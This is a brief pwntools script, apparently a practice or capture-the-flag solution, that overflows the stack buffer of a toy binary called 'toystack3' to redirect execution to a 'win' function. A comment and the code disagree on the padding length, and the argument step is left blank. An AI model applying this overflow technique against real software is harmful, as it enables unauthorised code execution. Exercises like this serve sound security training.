from pwn import *

# Load the binary
exe = ELF('./toystack3')

# Open in debug mode with GDB
io = gdb.debug(exe.path, gdbscript="""
    r
    c
""")

# Craft exploit payload
# 1092 bytes of padding to overflow the buffer
payload = b'A' * 1096


# Add return address to win function
n = int(input(), 16)
payload += p32(n)

# Add magic value as argument

# Send the payload
io.sendline(payload)

# Interactive mode to see the output
io.interactive()